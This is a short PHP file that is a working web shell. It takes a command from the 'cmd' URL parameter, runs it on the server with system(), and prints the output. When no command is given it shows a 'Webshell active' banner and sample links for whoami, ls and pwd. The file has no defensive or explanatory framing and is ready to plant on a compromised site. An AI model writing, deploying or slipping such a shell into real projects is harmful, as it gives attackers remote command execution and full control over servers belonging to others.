<?php
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    echo "<pre>";
    system($command);
    echo "</pre>";
} else {
    echo "<p>Webshell active. Use ?cmd=YOUR_COMMAND to execute commands.</p>";
    echo "<p>Examples:</p>";
    echo "<ul>";
    echo "<li><a href='?cmd=whoami'>?cmd=whoami</a></li>";
    echo "<li><a href='?cmd=ls'>?cmd=ls (list current directory)</a></li>";
    echo "<li><a href='?cmd=pwd'>?cmd=pwd (print working directory)</a></li>";
    echo "</ul>";
}
?>